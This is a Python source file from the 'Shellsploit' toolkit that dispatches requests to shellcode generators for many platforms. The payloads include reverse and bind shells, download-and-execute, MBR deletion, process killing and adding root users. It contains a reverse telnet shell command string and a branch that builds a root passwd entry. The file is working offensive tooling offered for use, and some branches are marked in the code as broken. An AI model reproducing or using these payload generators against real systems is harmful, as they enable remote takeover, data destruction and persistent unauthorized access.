#------------------Bombermans Team---------------------------------# 
#Author  : B3mB4m
#Concat  : b3mb4m@protonmail.com
#Project : https://github.com/b3mb4m/Shellsploit
#LICENSE : https://github.com/b3mb4m/Shellsploit/blob/master/LICENSE
#------------------------------------------------------------------#


def generator( choose, shellcode, argv="None", argv2="None"):
	if choose == "linux_x86":
		if shellcode == "exit":
			from Linux86.exit import exit
			return exit()
		elif shellcode == "egghunter":
			from Linux86.egghunter import egghunter
			return egghunter()
		elif shellcode == "bin_sh":
			from Linux86.bin_sh import bin_sh
			return bin_sh()
		elif shellcode == "reboot":
			from Linux86.reboot import reboot
			return reboot()
		elif shellcode == "DeleteMBR":
			from Linux86.MBRdelete import MBR
			return MBR()
		elif shellcode == "readfile":
			from Linux86.readfile import read
			from database.stackconvert import stackconvertSTR
			return read( stackconvertSTR(argv))
		elif shellcode == "shutdown":
			from Linux86.shutdown import shutdown
			return shutdown()
		elif shellcode == "bin_dash":
			from Linux86.bin_dash import bin_dash
			return bin_dash()
		elif shellcode == "killall":
			from Linux86.killall import killall
			return killall()
		elif shellcode == "ipv4forward":
			from Linux86.ipv4forward import ipv4
			return ipv4()		


		elif shellcode == "netcatbind":
			from Linux86.netcatbind import netcatbind
			from database.stackconvert import stackconvertSTR
			return netcatbind( stackconvertSTR(argv))
		elif shellcode == "add_user":
			from database.stackconvert import stackconvertSTR
			from Linux86.add_user import add_user
			return add_user( stackconvertSTR(argv))
		elif shellcode == "mkdir":
			from database.stackconvert import stackconvertSTR
			from Linux86.mkdir import mkdir
			return mkdir( stackconvertSTR(argv))
		elif shellcode == "download&exec":
			from Linux86.download import download
			from database.stackconvert import stackconvertSTR
			cache = argv.split("/")[-1]
			if len(cache) != 1:
				return "Please change file name with one character.\nThat will provide shortest shellcode."	
			else:
				cache = cache.encode("hex")
			return download( cache, stackconvertSTR(argv))

		elif shellcode == "chmod":
			from Linux86.chmod import ch
			from database.stackconvert import stackconvertSTR
			return ch( stackconvertSTR(argv))

		elif shellcode == "rmdir":
			from database.stackconvert import stackconvertSTR
			from Linux86.rmdir import rmdir
			return rmdir( stackconvertSTR(argv))

		elif shellcode == "tcp_bind":
			from Linux86.tcp_bind import tcp_bind
			from database.stackconvert import PORT
			return tcp_bind(  PORT(argv))

		elif shellcode == "reverse_tcp":
			from Linux86.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcp( IP(argv), PORT(argv2))
		
		elif shellcode == "reverse_telnet":
			from Linux86.reverse_telnet import reverse_telnet
			from database.stackconvert import plaintextreverse
			command = "/bin/sh -c /bin/telnet %s %s|/bin/sh|/bin/telnet %s %s" % (argv,argv2,argv,argv2)
			print command
			return reverse_tcp( plaintextreverse(command))

	elif choose == "linux_x64":
		if shellcode == "bin_sh":
			from Linux64.bin_sh import bin_sh
			return bin_sh()
		elif shellcode == "shutdown":
			from Linux64.shutdown import shutdown
			return shutdown()
	
		#Seems like not working ..
		elif shellcode == "tcp_bind":
			from Linux64.tcp_bind import tcp_bind
			from database.stackconvert import plaintext
			if argv == "None":
				print "Default port active !"
				print "PORT : 1234"
				return tcp_bind( "\x4D\x02") 
			else:
				return tcp_bind( plaintext(argv))

		elif shellcode == "reverse_tcp":
			from Linux64.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			if argv == "None" or argv2 == "None":
				print "Default settings active !"
				print "IP 	: 127.1.1.1"
				print "PORT : 1234"
				return reverse_tcp( r"\x4D\x02", r"\x7F\x01\x01\x01")
			else:
				return reverse_tcp( IP(argv2), PORT(argv))
		
		elif shellcode == "reboot":
			from Linux64.reboot import reboot
			return reboot()
		
		elif shellcode == "mkdir":
			from Linux64.mkdir import mkdir
			from database.stackconvert import plaintext
			return mkdir( plaintext(argv))
  		
  		elif shellcode == "egghunter":
			from Linux64.egghunter import egghunter
			return egghunter()
		

		#Seems like buggy ..
		elif shellcode == "add_map":
			from Linux64.addmap import addmap
			from database.stackconvert import plaintext
			command = "%s %s" % (argv2,argv)
			return addmap( plaintext(command))
		

		#Will be rewritten source not reliable.
		#elif shellcode == "add_user":
			#from Linux64.add_user import add_user
			#return add_user()
		
		elif shellcode == "readfile":
			from Linux64.read import read
			from database.stackconvert import plaintext
			return read( plaintext(argv))
		

		elif shellcode == "netcatreverse":
			from Linux64.netcatbind import netcatbind
			return netcatbind()

	elif choose == "osx86":
		if shellcode == "tcp_bind":
			from OSX86.tcp_bind import tcp_bind
			return tcp_bind( argv)
		elif shellcode == "bin_sh":
			from OSX86.bin_sh import bin_sh
			return bin_sh()

	elif choose == "osx64":
		if shellcode == "bin_sh":
			from OSX64.bin_sh import bin_sh
			return bin_sh()
		
		elif shellcode == "reverse_tcp":
			from OSX64.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			
			if argv == "None" or argv2 == "None":
				print "Default settings active !"
				print "IP 	: 127.1.1.1"
				print "PORT : 1234"
				return reverse_tcp( r"\x7F\x01\x01\x01", r"\x4D\x02")
			else:
				return reverse_tcp( IP(argv), PORT(argv2))
		
		elif shellcode == "tcp_bind":
			from OSX64.tcp_bind import tcp_bind
			from database.stackconvert import PORT
			if argv == "None":
				print "Default port active !"
				print "PORT : 1234"
				return tcp_bind( r"\x4D\x02") 
			else:
				return tcp_bind( PORT(argv)[::-1])

	elif choose == "freebsd_x86":
		if shellcode == "bin_sh":
			from FreeBSDx86.bin_sh import bin_sh
			return bin_sh()		
		elif shellcode == "reboot":
			from FreeBSDx86.reboot import reboot
			return reboot()
		elif shellcode == "killall":
			from FreeBSDx86.killall import killall
			return killall()	
		

		elif shellcode == "read":
			from FreeBSDx86.read import read
			from database.plaintext import plaintext
			return read(plaintext(argv))
	
		elif shellcode == "netcatreverse":
			from FreeBSDx86.netcatreverse import netcatreverse
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return netcatreverse(IP(argv), PORT(argv2))


		elif shellcode == "reverse_tcp":
			from FreeBSDx86.reverse_tcp import reverse_tcp
			return reverse_tcp()
	

		elif shellcode == "reverse_tcp2":
			from FreeBSDx86.reverse_tcp2 import reverse_tcp2
			return reverse_tcp2()
		
		elif shellcode == "exec":
			from FreeBSDx86.execc import execc
			from database.plaintext import plaintext
			command = '/bin/sh -c %s' % argv
			return execc(plaintext(argv))
		
		elif shellcode == "add_user":
			#Must be rebuild
			from FreeBSDx86.add_user import add_user
			return add_user()

	elif choose == "freebsd_x64":
		if shellcode == "bin_sh":
			from FreeBSDx64.bin_sh import bin_sh
			return bin_sh()		
		
		elif shellcode == "tcp_bind":
			from database.stackconvert import plaintext
			from database.stackconvert import PORT
			from FreeBSDx64.tcp_bind import tcp_bind
			return tcp_bind( PORT(argv), plaintext(argv2))	

	elif choose == "linux_arm":
		if shellcode == "chmod":
			from LinuxARM.chmod import chmod
			from database.stackconvert import plaintext
			if argv == "None":
				return "FILE PATH must be declared."
			else:
				return chmod( plaintext(argv))
		elif shellcode == "creat":
			from LinuxARM.creat import creat
			from database.stackconvert import plaintext
			if argv == "None":
				return "FILE PATH must be declared."
			else:
				return creat( plaintext(argv))
		elif shellcode == "bin_sh":
			from LinuxARM.bin_sh import bin_sh
			return bin_sh()		
		elif shellcode == "killall":
			from LinuxARM.killall import killall
			return killall()	
		
		elif shellcode == "add_user":
			from database.stackconvert import plaintext
			from LinuxARM.add_user import add_user
			import crypt
			command = "%s:%s" % (argv2,crypt.crypt(argv,'$1$KQYl/yru'))
			command = plaintext(command+":0:0:root:/root:/bin/bash")+"\\x0a"
			return add_user(command)	



	elif choose == "linux_mips":
		if shellcode == "reverse_tcp":
			from LinuxMIPS.reverse_tcp import reverse_tcp
			if argv == "None" or argv2 == "None":
				print "Default settings active !"
				print "IP 	: 127.1.1.1"
				print "PORT : 1234"
				return reverse_tcp( r"\x4D\x02", r"\x7F\x01\x01\x01")
			else:
				return reverse_tcp( argv, argv2)
		elif shellcode == "bin_sh":
			from LinuxMIPS.bin_sh import bin_sh
			return bin_sh()
		elif shellcode == "reboot":
			from LinuxMIPS.reboot import reboot
			return reboot()
		elif shellcode == "chmod": 	#NOT WORKING
			if argv == "None":
				return "FILE PATH must be declared."
			else:
				from LinuxMIPS.chmod import chmod
				return chmod( argv)

	elif choose == "windows":
		if shellcode == "add_user":
			from Windows import add_user
			return add_user()
		
		elif shellcode == "messagebox":
			from Windows import messagebox
			return messagebox()
		elif shellcode == "downloandandexecute":
			from Windows import downloandandexecute
			if argv == "None":
				return "ERRROR Bla bla"
			else:
				return downloandandexecute( argv, argv2)
		
		elif shellcode == "exec":
			from Windows import execc
			return execc.WinExec(argv)

	#Solaris x86 will be sleep.
	elif choose == "solarisx86":	
		if shellcode == "readfile":
			from Solarisx86.read import read
			from database.plaintext import plaintext
			return read( plaintext(argv))		

